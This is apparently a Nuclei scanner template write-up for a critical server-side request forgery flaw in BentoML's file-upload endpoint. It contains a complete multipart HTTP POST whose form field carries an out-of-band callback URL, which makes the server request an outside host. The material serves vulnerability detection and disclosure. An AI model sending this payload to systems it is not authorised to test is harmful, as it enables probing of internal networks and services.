# Nuclei Template: Bentoml - Server Side Request Forgery
**Template ID:** bentoml-ssrf
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** Critical
**CWE:** CWE-918
**Source:** Nuclei Template (`bentoml-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
BentoML's upload file request is vulnerable to SSRF that allowing attacker to access internal service (local network).

## Steps to reproduce / Exploit Payload
```http
POST /encode_image HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGqThdiCjrkRXHqIr

------WebKitFormBoundaryGqThdiCjrkRXHqIr
Content-Disposition: form-data; name="items";

http://{{interactsh-url}}/{{rand}}
------WebKitFormBoundaryGqThdiCjrkRXHqIr--
```

## References
- https://huntr.com/bounties/901ae5bd-5e24-4f1f-be9f-aa03fa6e1316
